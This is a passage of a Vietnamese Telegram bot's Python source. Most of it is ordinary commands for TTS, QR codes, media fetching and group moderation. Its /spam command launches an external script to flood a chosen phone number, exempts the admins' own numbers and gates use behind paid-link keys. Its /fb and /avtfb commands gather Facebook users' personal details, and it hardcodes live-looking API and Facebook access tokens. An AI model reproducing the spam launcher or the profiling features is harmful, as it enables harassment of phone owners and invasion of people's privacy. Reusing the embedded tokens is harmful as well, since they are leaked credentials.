        bot.send_message(message.chat.id, "Vui lòng nhập biển số xe. Ví dụ: /vi_pham 24A14307")
    except Exception as e:
        bot.send_message(message.chat.id, f"Lỗi: {str(e)}")


@bot.message_handler(commands=['voice'])
def text_to_voice(message):
    # Lấy nội dung văn bản sau lệnh /voice
    text = message.text[len('/voice '):].strip()

    # Nếu không có văn bản, trả lời hướng dẫn sử dụng
    if not text:
        bot.reply_to(message, "🤖 Tqhuy-BOT\nUsage: /voice <Text>")
        return

    # Tạo tệp tạm thời để lưu file .mp3 với tên "elven"
    temp_file_path = tempfile.mktemp(suffix='elven.mp3')

    try:
        # Chuyển văn bản thành giọng nói bằng gTTS
        tts = gTTS(text, lang='vi')
        tts.save(temp_file_path)

        # Mở và gửi file âm thanh .mp3 với tên "elven"
        with open(temp_file_path, 'rb') as audio_file:
            bot.send_voice(chat_id=message.chat.id, voice=audio_file)

    except Exception as e:
        bot.reply_to(message, "🤖 VuThiHoa-BOT\nError Bot")
    
    finally:
        # Xóa tệp âm thanh tạm thời sau khi gửi
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)

@bot.message_handler(commands=['qr'])
def generate_qr(message):
    # Tách từ khóa nhập vào lệnh
    input_text = message.text.split(maxsplit=1)
    
    if len(input_text) > 1:
        input_text = input_text[1]  # Lấy phần từ khóa sau /qr
        # Tạo QR code
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(input_text)
        qr.make(fit=True)
        
        img = qr.make_image(fill='black', back_color='white')
        bio = BytesIO()
        bio.name = 'qr.png'
        img.save(bio, 'PNG')
        bio.seek(0)

        # Gửi ảnh QR tới người dùng
        bot.send_photo(message.chat.id, photo=bio, caption=f"<blockquote>QR của chữ: {input_text}</blockquote>",parse_mode="HTML")
    else:
        bot.reply_to(message, "🤖 VuThiHoa_bot\n🤖 Usage: /qr <Chữ Cần Tạo QR>")


# Sử lí GetKey
from datetime import datetime

def TimeStamp():
    now = datetime.now().date()  # Đúng cách lấy ngày hiện tại
    return now

def get_time_vietnam():
    return datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")

def init_db():
    connection = sqlite3.connect('users.db', check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            key TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    connection.commit()
    connection.close()

init_db()


# Thiết lập cơ sở dữ liệu
def setup_database():
    connection = sqlite3.connect('users.db', check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            key TEXT,
            has_used_key INTEGER DEFAULT 0
        )
    ''')
    connection.commit()
    connection.close()

setup_database()


# Lệnh lấy key
@bot.message_handler(commands=['getkey_spam'])
def startkey(message):
    if not check_access(message):  # Kiểm tra quyền
        return

    bot.reply_to(message, text='🔄 VUI LÒNG ĐỢI TRONG GIÂY LÁT...')
    today = datetime.now().date()  # Lấy ngày hiện tại
    key = "NgocDoiAn_" + str(int(message.from_user.id) * int(today.day) - 12666)
    key = "https://www.thengoc.x10.mx/?key=" + key
    api_token = '678872637ebb6e7ecd0fcbb6'

    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api={api_token}&url={key}')
        url = response.json()
        
        if 'shortenedUrl' in url:
            url_key = url['shortenedUrl']
        else:
            bot.reply_to(message, '❌ Không tìm thấy shortenedUrl trong phản hồi.')
            return

    except requests.RequestException as e:
        bot.reply_to(message, '❌ Đã xảy ra lỗi khi kết nối đến API.')
        print(f"Request error: {e}")
        return

    text = f'''
- LINK LẤY KEY CỦA @{message.from_user.username} NGÀY {datetime.now().strftime('%d-%m-%Y')} LÀ: {url_key} 
- KHI LẤY KEY XONG, DÙNG LỆNH /key_spam <key> ĐỂ KÍCH HOẠT QUYỀN SỬ DỤNG /spam.
    '''
    bot.reply_to(message, text)

# Lệnh kiểm tra key
@bot.message_handler(commands=['key_spam'])
def key(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    if len(message.text.split()) == 1:
        bot.reply_to(message, '❌ VUI LÒNG NHẬP KEY. DÙNG /key_spam <key>')
        return

    user_id = message.from_user.id
    key = message.text.split()[1]
    today = datetime.now().date()  # Lấy ngày hiện tại
    expected_key = "NgocDoiAn_" + str(int(message.from_user.id) * int(today.day) - 12666)

    if key == expected_key:
        # Lưu trạng thái đã nhập key vào file
        user_dir = f'./user/{today.day}/'
        os.makedirs(user_dir, exist_ok=True)  # Tạo thư mục nếu chưa tồn tại
        with open(f'{user_dir}/{user_id}.txt', 'w') as f:
            f.write("")  # File rỗng để đánh dấu đã kích hoạt quyền

        bot.reply_to(message, '☑️ KEY HỢP LỆ ☑️. BẠN ĐÃ ĐƯỢC PHÉP SỬ DỤNG LỆNH /spam.')
    else:
        bot.reply_to(message, '❌ KEY KHÔNG HỢP LỆ. VUI LÒNG KIỂM TRA LẠI.')

from collections import defaultdict

conversation_history = defaultdict(list)  # Mặc định mỗi user_id sẽ có một list rỗng


@bot.message_handler(commands=['spam'])
def spam(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    user_id = message.from_user.id
    username = message.from_user.username
    current_time = time.time()

    # Cooldown logic: kiểm tra thời gian chờ
    if username in cooldown_dict and current_time - cooldown_dict[username].get('spam', 0) < 65:
        remaining_time = int(65 - (current_time - cooldown_dict[username].get('spam', 0)))
        bot.reply_to(message, f"@{username}, vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /spam.")
        return

    today = date.today()
    user_directory = f"./user/{today.day}/"
    user_file_path = os.path.join(user_directory, f"{user_id}.txt")

    # Kiểm tra xem thư mục có tồn tại không
    if not os.path.exists(user_directory):
        os.makedirs(user_directory)  # Tạo thư mục nếu chưa tồn tại

    if not os.path.exists(user_file_path):
        bot.reply_to(message, '*Vui lòng GET KEY của ngày hôm nay* -Dùng /getkey_spam để lấy key và dùng /key_spam để nhập key hôm nay.')
        return

    # Kiểm tra số điện thoại và lặp
    if len(message.text.split()) < 3:
        bot.reply_to(message, 'VUI LÒNG NHẬP SỐ ĐIỆN THOẠI VÀ SỐ LẦN SPAM!')
        return

    phone_number = message.text.split()[1]
    lap = message.text.split()[2]

    if not lap.isnumeric() or not (1 <= int(lap) <= 10):
        bot.reply_to(message, "Vui lòng spam trong khoảng 1-10. Nếu nhiều hơn mua vip để sài 😼")
        return

    if phone_number in ["0985237602", "0326274360","0339946702"]:
        bot.reply_to(message, "Spam số ADMIN bạn ạ đừng đụng kẻo ăn ban")
        return

    file_path = os.path.join(os.getcwd(), "smsv2.py")

    # Use a single file path and process
    process = subprocess.Popen(["python3", file_path, phone_number, lap])
    processes.append(process)

    thoigian = dt.now().strftime('%d-%m-%Y %H:%M:%S')

    video_url = "https://files.catbox.moe/2vx7k6.mp4"  # Replace this with the actual video URL
    message_text = (f'''
> ┌──────⭓ {name_bot} ⭓──────
> │» User: @{username} đã gửi spam                     
> │» Spam: Thành Công [✓]
> │» User: Free
> │» Attacking: {phone_number}
> │» Admin: Ngocdoian 
> │» Số lần {lap}
> │» Telegram Admin: Ngocdoian
> └────────────[✓]─────────
   ''')
    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')

    # Lưu thời gian sử dụng lệnh cuối cùng
    if username not in cooldown_dict:
        cooldown_dict[username] = {}
    cooldown_dict[username]['spam'] = current_time

@bot.message_handler(commands=['info'])
def handle_check(message):
    user = message.reply_to_message.from_user if message.reply_to_message else message.from_user
    
    # Hiển thị biểu tượng đợi
    waiting = bot.reply_to(message, "🔎")
    
    # Lấy thông tin người dùng
    user_photos = bot.get_user_profile_photos(user.id)
    chat_info = bot.get_chat(user.id)
    chat_member_status = bot.get_chat_member(message.chat.id, user.id).status
    
    bio = chat_info.bio or "Không có bio"
    user_first_name = user.first_name
    user_last_name = user.last_name or ""
    user_username = f"@{user.username}" if user.username else "Không có username"
    user_language = user.language_code or 'Không xác định'
    
    # Định nghĩa trạng thái người dùng
    status_dict = {
        "creator": "Admin chính",
        "administrator": "Admin",
        "member": "Thành viên",
        "restricted": "Bị hạn chế",
        "left": "Rời nhóm",
        "kicked": "Bị đuổi khỏi nhóm"
    }
    status = status_dict.get(chat_member_status, "Không xác định")
    
    # Soạn tin nhắn gửi đi
    caption = (
        "<pre>     🚀 THÔNG TIN 🚀\n"
        "┌──────────⭓INFO⭓─────────\n"
        f"│» 🆔: <b>{user.id}</b>\n"
        f"│» 👤Tên: {user_first_name} {user_last_name}\n"
        f"│» 👉Username: {user_username}\n"
        f"│» 🔰Ngôn ngữ: {user_language}\n"
        f"│» 🏴Trạng thái: {status}\n"
        f"│» ✍️Bio: {bio}\n"
        f"│» 🤳Avatar: {'Đã có avatar' if user_photos.total_count > 0 else 'Không có avatar'}\n"
        "└───────────────[✓]─────────────</pre>"
    )
    
    # Gửi ảnh hoặc tin nhắn văn bản
    if user_photos.total_count > 0:
        bot.send_photo(message.chat.id, user_photos.photos[0][-1].file_id, caption=caption, parse_mode='HTML', reply_to_message_id=message.message_id)
    else:
        bot.reply_to(message, caption, parse_mode='HTML')
    
    # Xóa tin nhắn chờ sau khi hoàn tất
    def xoatn(message, delay):
        try:
            bot.delete_message(message.chat.id, waiting.message_id)
        except Exception as e:
            print(f"Lỗi khi xóa tin nhắn: {e}")
    
    threading.Thread(target=xoatn, args=(message, 0)).start()

@bot.message_handler(commands=['check'])
def check_hot_web(message):
    # Kiểm tra xem lệnh có đủ tham số không (URL của trang web cần kiểm tra)
    if len(message.text.split()) < 2:
        bot.reply_to(message, '<blockquote>Vui lòng cung cấp URL của trang web cần kiểm tra (VD: /check https://example.com).</blockquote>',parse_mode='HTML')
        return
    
    # Lấy URL từ lệnh
    url = message.text.split()[1]

    try:
        # Gửi yêu cầu HTTP GET đến URL
        response = requests.get(url, timeout=10)
        
        # Kiểm tra trạng thái của trang web
        if response.status_code == 200:
            bot.reply_to(message, f"<blockquote>🔗 Trang web {url} đang hoạt động bình thường (Status: 200 OK).</blockquote>", parse_mode='HTML')
        else:
            bot.reply_to(message, f"<blockquote>⚠️ Trang web {url} có vấn đề (Status: {response.status_code}).</blockquote>", parse_mode='HTML')
    except requests.exceptions.RequestException as e:
        # Xử lý lỗi nếu không thể kết nối tới trang web
        bot.reply_to(message, f"<blockquote>❌ Không thể kết nối tới trang web {url}. Lỗi: {e}</blockquote>", parse_mode='HTML')

@bot.message_handler(commands=['checkip'])
def check_ip(message):
    # Lấy các tham số từ lệnh
    params = message.text.split()
    
    if len(params) < 2:
        bot.reply_to(message, 'Vui lòng cung cấp địa chỉ IP cần kiểm tra (VD: /checkip 8.8.8.8).')
        return
    
    ip_address = params[1]

    try:
        # Gửi yêu cầu tới dịch vụ API để lấy thông tin chi tiết về địa chỉ IP
        response = requests.get(f'https://ipinfo.io/{ip_address}/json', timeout=10)
        response.raise_for_status()  # Kiểm tra lỗi HTTP
        
        # Lấy dữ liệu từ phản hồi
        ip_data = response.json()

        # Trích xuất thông tin chi tiết
        city = ip_data.get('city', 'Không xác định')
        region = ip_data.get('region', 'Không xác định')
        country = ip_data.get('country', 'Không xác định')
        org = ip_data.get('org', 'Không xác định')
        loc = ip_data.get('loc', 'Không xác định')
        
        # Tạo thông tin để gửi cho người dùng
        ip_info = (f"<blockquote>🌐 Địa chỉ IP: {ip_address}\n"
                   f"📍 Thành phố: {city}\n"
                   f"🏛 Khu vực: {region}\n"
                   f"🌎 Quốc gia: {country}\n"
                   f"🏢 Tổ chức: {org}\n"
                   f"📍 Vị trí (Lat, Lng): {loc}</blockquote>")
        
        # Gửi thông tin địa chỉ IP tới người dùng
        bot.reply_to(message, ip_info, parse_mode='HTML')
    except requests.exceptions.RequestException as e:
        # Xử lý lỗi nếu không thể kết nối đến dịch vụ API
        bot.reply_to(message, f"<blockquote>❌ Không thể kết nối tới dịch vụ kiểm tra IP. Lỗi: {e}</pre>", parse_mode='blockquote')
    except Exception as e:
        # Xử lý các lỗi khác
        bot.reply_to(message, f"<blockquote>❌ Đã xảy ra lỗi khi kiểm tra IP. Lỗi: {e}</pre>", parse_mode='blockquote')

@bot.message_handler(commands=['html'])
def handle_code_command(message):
    # Tách lệnh và URL từ tin nhắn
    command_args = message.text.split(maxsplit=1)

    # Kiểm tra xem URL có được cung cấp không
    if len(command_args) < 2:
        bot.reply_to(message, "Vui lòng cung cấp url sau lệnh /html. Ví dụ: /html https://example.com")
        return

    url = command_args[1]
    
    # Kiểm tra xem URL có hợp lệ không
    parsed_url = urlparse(url)
    if not parsed_url.scheme or not parsed_url.netloc:
        bot.reply_to(message, "Vui lòng cung cấp một URL hợp lệ.")
        return

    domain = parsed_url.netloc
    file_name = f"NgocDoiAn_get.html"
    
    try:
        # Lấy nội dung HTML từ URL
        response = requests.get(url)
        response.raise_for_status()  # Xảy ra lỗi nếu có lỗi HTTP

        # Lưu nội dung HTML vào file
        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(response.text)

        # Định dạng HTML và gửi file về người dùng
        with open(file_name, 'rb') as file:
            caption = f"<blockquote>HTML của trang web:\n{url}</blockquote>"
            bot.send_document(message.chat.id, file, caption=caption, parse_mode='HTML')

    except requests.RequestException as e:
        bot.reply_to(message, f"Đã xảy ra lỗi khi tải trang web: {e}")

    except Exception as e:
        bot.reply_to(message, f"Đã xảy ra lỗi khi xử lý file: {e}")

    finally:
        # Đảm bảo xóa file sau khi gửi
        if os.path.exists(file_name):
            try:
                os.remove(file_name)
            except Exception as e:
                bot.reply_to(message, f"Đã xảy ra lỗi khi xóa file: {e}")


#sử lí lệnh mở mõm và khóa mõ
@bot.message_handler(commands=['im'])
def warn_user(message):
    if not is_admin(message):
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return
    
    # Kiểm tra xem tin nhắn có chứa thông tin cần thiết không
    if not message.reply_to_message:
        bot.reply_to(message, '<blockquote>Ơ !!!</blockquote>', parse_mode='HTML')
        return

    user_id = message.reply_to_message.from_user.id
    
    try:
        # Cấm chat người dùng trong 15 phút
        until_date = int(time.time()) + 30 * 60
        bot.restrict_chat_member(
            chat_id=message.chat.id,
            user_id=user_id,
            can_send_messages=False,
            can_send_media_messages=False,
            can_send_polls=False,
            can_send_other_messages=False,
            can_add_web_page_previews=False,
            until_date=until_date
        )
        
        # Gửi tin nhắn thông báo người dùng đã bị cấm chat trong 15 phút
        bot.send_message(
            message.chat.id, 
            f"<blockquote>⚠️ Người dùng với ID {user_id} đã bị cảnh báo và cấm chat trong 30 phút.</blockquote>",
            parse_mode='HTML'
        )
    except Exception as e:
        # Nếu có lỗi xảy ra
        bot.reply_to(message, "<blockquote>Không thể cảnh báo người dùng. Vui lòng kiểm tra lại thông tin hoặc quyền hạn của bot.</blockquote>", parse_mode='HTML')
        print(f"Error warning user: {e}")

@bot.message_handler(commands=['unim'])
def unrestrict_user(message):
    if not is_admin(message):
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return
    
    # Kiểm tra xem tin nhắn có chứa thông tin cần thiết không
    if not message.reply_to_message:
        bot.reply_to(message, '<blockquote>Vui lòng trả lời tin nhắn của người dùng cần hủy cấm chat.</blockquote>', parse_mode='HTML')
        return

    user_id = message.reply_to_message.from_user.id
    
    try:
        # Gỡ bỏ hạn chế chat cho người dùng
        bot.restrict_chat_member(
            chat_id=message.chat.id,
            user_id=user_id,
            can_send_messages=True,
            can_send_media_messages=True,
            can_send_polls=True,
            can_send_other_messages=True,
            can_add_web_page_previews=True,
            until_date=0  # Không cấm chat nữa
        )
        
        # Gửi tin nhắn thông báo người dùng đã được phép chat trở lại
        bot.send_message(
            message.chat.id, 
            f"<blockquote>✅ Người dùng với ID {user_id} đã được phép chat trở lại.</blockquote>", 
            parse_mode='HTML'
        )
    except Exception as e:
        # Nếu có lỗi xảy ra
        bot.reply_to(message, '<blockquote>Không thể gỡ cấm chat cho người dùng. Vui lòng kiểm tra lại thông tin hoặc quyền hạn của bot.</blockquote>', parse_mode='HTML')
        print(f"Error unrestricted user: {e}")
# File lưu danh sách block
BLOCKED_USERS_FILE = "block.txt"

# Tạo file block nếu chưa tồn tại
if not os.path.exists(BLOCKED_USERS_FILE):
    with open(BLOCKED_USERS_FILE, "w") as f:
        f.write("")

# Hàm đọc danh sách block từ file
def load_blocked_users():
    with open(BLOCKED_USERS_FILE, "r") as f:
        return [int(user_id.strip()) for user_id in f.readlines() if user_id.strip().isdigit()]

# Hàm lưu danh sách block vào file
def save_blocked_users(blocked_users):
    with open(BLOCKED_USERS_FILE, "w") as f:
        f.write("\n".join(map(str, blocked_users)))

# Load danh sách người dùng bị block
BLOCKED_USERS = load_blocked_users()

# Hàm kiểm tra người dùng có bị block hay không
def is_blocked(user_id):
    return user_id in BLOCKED_USERS

# Hàm block người dùng
def block_user(user_id):
    if user_id not in BLOCKED_USERS:
        BLOCKED_USERS.append(user_id)
        save_blocked_users(BLOCKED_USERS)

# Hàm unblock người dùng
def unblock_user(user_id):
    if user_id in BLOCKED_USERS:
        BLOCKED_USERS.remove(user_id)
        save_blocked_users(BLOCKED_USERS)

@bot.message_handler(commands=["ban"])
def ban_user(message):
    if not is_admin(message):  # Kiểm tra quyền admin
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return  # Thoát nếu không có quyền

    target_user_id = None

    # Lấy ID từ trả lời tin nhắn
    if message.reply_to_message:
        target_user_id = message.reply_to_message.from_user.id

    # Lấy ID từ tham số nếu được nhập
    elif len(message.text.split()) > 1:
        try:
            target_user_id = int(message.text.split()[1])
        except ValueError:
            bot.reply_to(message, "❌ ID người dùng không hợp lệ. Vui lòng nhập ID hợp lệ.")
            return

    # Kiểm tra nếu không có người dùng nào được xác định
    if not target_user_id:
        bot.reply_to(message, "❌ Không thể xác định người dùng cần ban. Hãy trả lời tin nhắn hoặc nhập ID.")
        return

    # Block người dùng
    block_user(target_user_id)

    # Kick người dùng khỏi nhóm
    try:
        bot.kick_chat_member(message.chat.id, target_user_id)
        bot.reply_to(message, f"✅ Người dùng {target_user_id} đã bị cấm và bị đuổi khỏi nhóm.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Không thể kick người dùng.")

@bot.message_handler(commands=['tiktok'])
def tiktokdl(message):
    if not bot_active:
        bot.send_message(message.chat.id, "🤖 VuThiHoa-BOT\nVuThiHoa Đang Tắt Hiện Các Thành Viên Không Thể Sử Dụng")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "🎬 [/tiktok <Link Video>] 🎬")
        return

    url = args[1]
    api_url = f"https://tikwm.com/api/?url={url}"

    bot.reply_to(message, "💸 Đang GET Thông Tin Video 💸")

    try:
        response = requests.get(api_url)
        response.raise_for_status()
        data = response.json()

        if 'data' in data and 'play' in data['data']:
            video_url = data['data']['play']
            title = data['data'].get('title', 'Video TikTok')

            video_response = requests.get(video_url)
            video_response.raise_for_status()
            video_file = BytesIO(video_response.content)
            video_file.name = f"{title}.mp4"

            message_text = f"<b>🎬 Video Name:</b> <i>{title}</i>"
            bot.send_message(message.chat.id, message_text, parse_mode='HTML')
            bot.send_video(message.chat.id, video_file, caption="🎬 Video Play 🎬")

        else:
            bot.reply_to(message, "💸 Lỗi Server 💸")

    except requests.RequestException:
        bot.reply_to(message, "💸 Lỗi Server 💸")

@bot.message_handler(commands=['gai'])
def send_gai_image(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    api_url = "https://subhatde.id.vn/images/gai"

    # Send a "searching" message
    searching_message = bot.reply_to(message, "🔎")
    sent_messages.append(searching_message.message_id)  # Store the message ID

    try:
        # Request image data from the API
        response = requests.get(api_url)
        data = response.json()

        # Delete the "searching" message after getting the response
        try:
            bot.delete_message(searching_message.chat.id, searching_message.message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Ignore if already deleted

        # Check if response contains an "url" field
        if 'url' in data:
            image_url = data['url']

            # Send the image to the user with a caption
            caption_text = f"Ảnh Mà Bạn Yêu Cầu, @{message.from_user.username}"
            sent_message = bot.send_photo(message.chat.id, image_url, caption=caption_text)
            sent_messages.append(sent_message.message_id)  # Store the message ID

            # Start a thread to delete all messages after 60 seconds
            threading.Thread(target=delete_all_messages_after_delay, args=(message.chat.id, 60)).start()
        else:
            bot.reply_to(message, "Không tìm thấy ảnh từ API.")
    except Exception as e:
        # Delete the "searching" message if an error occurs
        try:
            bot.delete_message(searching_message.chat.id, searching_message.message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Ignore if already deleted
        bot.reply_to(message, f"Có lỗi xảy ra")

@bot.message_handler(commands=['anime'])
def send_gai_image(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    api_url = "https://keyherlyswar.x10.mx/Apidocs/anhanime.php"

    # Send a "searching" message
    searching_message = bot.reply_to(message, "🔎")
    sent_messages.append(searching_message.message_id)  # Store the message ID

    try:
        # Request image data from the API
        response = requests.get(api_url)
        data = response.json()

        # Delete the "searching" message after getting the response
        try:
            bot.delete_message(searching_message.chat.id, searching_message.message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Ignore if already deleted

        # Check if response contains an "url" field
        if 'url' in data:
            image_url = data['url']

            # Send the image to the user with a caption
            caption_text = f"Ảnh Mà Bạn Yêu Cầu, @{message.from_user.username}"
            sent_message = bot.send_photo(message.chat.id, image_url, caption=caption_text)
            sent_messages.append(sent_message.message_id)  # Store the message ID

            # Start a thread to delete all messages after 60 seconds
            threading.Thread(target=delete_all_messages_after_delay, args=(message.chat.id, 60)).start()
        else:
            bot.reply_to(message, "Không tìm thấy ảnh từ API.")
    except Exception as e:
        # Delete the "searching" message if an error occurs
        try:
            bot.delete_message(searching_message.chat.id, searching_message.message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Ignore if already deleted
        bot.reply_to(message, f"Có lỗi xảy ra")

@bot.message_handler(commands=['vdanime'])
def send_random_anime_video(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    try:
        waiting_message = bot.reply_to(message, "Đang lấy ảnh...⌛")

        # Lấy video từ API
        response = requests.get("https://keyherlyswar.x10.mx/Apidocs/anhanime.php", timeout=5)  # timeout để tránh chờ quá lâu
        data = response.json()

        if data and "url" in data:
            video_url = data["url"]
            bot.send_video(
                chat_id=message.chat.id,
                video=video_url,
                caption="🎬 ảnh anime ngẫu nhiên 🎥"
            )
        else:
            bot.send_message(message.chat.id, "Không thể lấy ảnh anime ngẫu nhiên.")
        
        bot.delete_message(message.chat.id, waiting_message.message_id)
    
    except requests.Timeout:
        bot.send_message(message.chat.id, "Quá thời gian chờ API. Vui lòng thử lại.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Đã có lỗi xảy ra")

# Hàm để xóa tất cả thông điệp sau một khoảng thời gian nhất định
def delete_all_messages_after_delay(chat_id, delay):
    time.sleep(delay)
    # Xóa các thông điệp đã gửi (thực hiện với các message_id đã lưu)
    for message_id in sent_messages:
        try:
            bot.delete_message(chat_id, message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Không làm gì nếu thông điệp đã bị xóa hoặc không tồn tại


# Hàm xử lý lệnh /capcut
@bot.message_handler(commands=['capcut'])
def i4cap(message):

    command_data = message.text.split()

    if len(command_data) != 2:
        bot.reply_to(message, "Vui lòng nhập link hợp lệ theo cú pháp:\n /capcut [link]")
        return

    link = command_data[1]
    api_url = f"https://subhatde.id.vn/capcut/info?url={link}"
    searching_message = bot.reply_to(message, "🔎")

    try:
        response = requests.get(api_url)
        # Xóa thông điệp tìm kiếm
        bot.delete_message(searching_message.chat.id, searching_message.message_id)

        data = response.json()

        if 'user' in data:
            user_info = data['user']
            statistics = data['user_statistics']
            relation_info = user_info.get('relation_info', {}).get('statistics', {})

            name = user_info.get('name', 'Không có tên')
            avatar_url = user_info.get('avatar_url', '')
            followers = relation_info.get('follower_count', 'Không có thông tin')
            likes = statistics.get('like_count', 'Không có thông tin')

            message_text = f"🔎 @{message.from_user.username} đã yêu cầu thông tin cho link: {link}\n" \
                           f"👤 Tên: {name}\n" \
                           f"📊 Người theo dõi: {followers}\n" \
                           f"❤️ Lượt thích: {likes}"

            if avatar_url:
                sent_message = bot.send_photo(message.chat.id, avatar_url, caption=message_text)
            else:
                sent_message = bot.send_message(message.chat.id, message_text)

            sent_messages.append(sent_message.message_id)
            threading.Thread(target=delete_all_messages_after_delay, args=(message.chat.id, 60)).start()

        else:
            bot.reply_to(message, "Không tìm thấy thông tin cho link này.")
    except Exception as e:
        bot.delete_message(searching_message.chat.id, searching_message.message_id)
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

@bot.message_handler(commands=['avtfb'])
def get_facebook_avatar(message):
    user_id = message.from_user.id

    # Check command format
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng định dạng\nExample: /avtfb [link hoặc id]')
        return
    
    # Gửi tin nhắn chờ xử lý
    waiting_message = bot.reply_to(message, '🔍')

    # Get parameter from the message
    parameter = message.text.split()[1]

    # Determine if it's a Facebook ID or a link
    if parameter.isdigit():  # If it's a Facebook ID
        facebook_id = parameter
    else:  # If it's a Facebook link
        if 'facebook.com' not in parameter:
            bot.edit_message_text('Liên kết không phải từ Facebook', message.chat.id, waiting_message.message_id)
            return
        
        # Use the API to get the Facebook ID from the URL
        api_url = f"https://keyherlyswar.x10.mx/Apidocs/findid.php?url={parameter}"
        try:
            api_response = requests.get(api_url)
            api_response.raise_for_status()
            json_response = api_response.json()
            
            if 'id' in json_response:
                facebook_id = json_response['id']
            else:
                bot.edit_message_text('Không thể lấy ID từ liên kết Facebook. Vui lòng thử lại với một liên kết khác.', message.chat.id, waiting_message.message_id)
                return
            
        except requests.RequestException as e:
            bot.edit_message_text(f'Có lỗi xảy ra khi truy cập API: {e}', message.chat.id, waiting_message.message_id)
            return
        except Exception as e:
            bot.edit_message_text(f'Có lỗi xảy ra: {e}', message.chat.id, waiting_message.message_id)
            return

    # Use the provided Facebook URL for the profile picture
    graph_url = f"https://graph.facebook.com/{facebook_id}/picture?width=1500&height=1500&access_token=2712477385668128%7Cb429aeb53369951d411e1cae8e810640"
    
    try:
        response = requests.get(graph_url)
        response.raise_for_status()
        
        # Send the avatar image to the user with a caption
        caption = f"<b>Avatar cho Facebook ID hoặc link</b>: <code>{facebook_id}</code>"
        bot.send_photo(message.chat.id, response.url, caption=caption, parse_mode='html')
        
        # Xóa tin nhắn chờ sau khi hoàn thành
        bot.delete_message(message.chat.id, waiting_message.message_id)
    
    except requests.RequestException as e:
        bot.edit_message_text(f'Có lỗi xảy ra khi truy cập Facebook: {e}', message.chat.id, waiting_message.message_id)
    except Exception as e:
        bot.edit_message_text(f'Có lỗi xảy ra: {e}', message.chat.id, waiting_message.message_id)


# Hàm lấy Facebook ID từ URL
def get_facebook_id_from_url(facebook_url):
    try:
        # API để lấy Facebook ID từ liên kết
        api_url = f"https://apiquockhanh.click/facebook/uid?link={facebook_url}"
        response = requests.get(api_url)
        response.raise_for_status()  # Kiểm tra nếu có lỗi HTTP
        
        # Parse dữ liệu JSON trả về từ API
        data = response.json()
        
        # Kiểm tra nếu có thông tin ID trong dữ liệu trả về
        if 'id' in data:
            return data['id']
        else:
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

# Hàm định dạng thời gian
from dateutil import parser 
# Hàm định dạng thời gian có hỗ trợ timezone
def format_timestamp(timestamp):
    try:
        # Sử dụng parser để phân tích chuỗi thời gian với timezone
        timestamp_obj = parser.isoparse(timestamp)  # Tự động xử lý cả múi giờ
        return timestamp_obj.strftime("%d-%m-%Y - %H:%M:%S")  # Định dạng lại kiểu ngày tháng giờ phút giây
    except Exception as e:
        print(f"Error formatting timestamp: {e}")
        return "Không có dữ liệu"
    
def get_facebook_info(uid):
    """Gọi API lấy thông tin từ UID"""
    api_url = f"https://api.sumiproject.net/facebook/getinfov2?uid={uid}&apikey=apikeysumi"
    try:
        response = requests.get(api_url)
        response.raise_for_status()
        data = response.json()

        print(f"[DEBUG] Full API Response:\n{data}")  # In toàn bộ JSON API

        if not data or "Thông tin cá nhân" not in data or not isinstance(data["Thông tin cá nhân"], dict):
            return None, "❌ API không trả về dữ liệu hợp lệ!"

        return data, None
    except requests.RequestException as e:
        return None, f"⚠️ Lỗi khi gọi API: {e}"

@bot.message_handler(commands=['fb'])
def handle_fb_command(message):
    waiting_message = bot.reply_to(message, '🔍 Đang lấy thông tin, vui lòng chờ...')

    try:
        args = message.text.split()
        if len(args) < 2:
            bot.edit_message_text("⚠️ Vui lòng sử dụng đúng định dạng: /fb {UID}", message.chat.id, waiting_message.message_id)
            return

        uid = args[1]
        print(f"[DEBUG] Đang lấy thông tin Facebook cho UID: {uid}")

        data, error_message = get_facebook_info(uid)
        if error_message:
            bot.edit_message_text(error_message, message.chat.id, waiting_message.message_id)
            return

        personal_info = data.get("Thông tin cá nhân", {})
        location_info = data.get("Vị trí hiện tại", {})
        education_info = data.get("Học vấn", {})
        work_info = data.get("Nơi làm việc", {})
        images_info = data.get("Hình ảnh", {})

        def get_value(data_dict, field, default="Không có"):
            return data_dict.get(field, default)

        fb_id = uid
        name = get_value(personal_info, "Tên")
        surname = get_value(personal_info, "Họ")
        username = get_value(personal_info, "Username")
        gender = get_value(personal_info, "Giới tính")
        profile_link = get_value(personal_info, "Liên kết")
        bio = get_value(personal_info, "Giới thiệu")
        birthday = get_value(personal_info, "Ngày sinh")
        relationship_status = get_value(personal_info, "Tình trạng mối quan hệ")
        followers = get_value(personal_info, "Người theo dõi")
        following = get_value(personal_info, "Đang theo dõi")
        timezone = get_value(personal_info, "Múi giờ")
        language = get_value(personal_info, "Ngôn ngữ")
